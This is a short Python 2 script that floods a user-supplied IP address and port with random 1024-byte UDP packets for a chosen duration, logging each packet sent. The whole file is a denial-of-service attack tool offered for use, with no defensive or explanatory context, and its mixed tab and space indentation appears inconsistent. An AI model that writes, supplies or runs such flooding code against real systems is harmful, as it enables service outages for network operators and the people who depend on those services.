import os
import sys
import time
import random
import socket

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes=random._urandom(1024)
ip=raw_input("Target IP address:")
port=input("Target Port:")
dur=raw_input("Enter an duration:")
timeout=time.time()+float(dur)
sent=0

while True:
	if time.time()>timeout:
		break
	else:
		sock.sendto(bytes,(ip,port))
		sent=sent+1
                print "Sent %s packets to %s IP address through %s port"%(sent,ip,port)
	
	
		
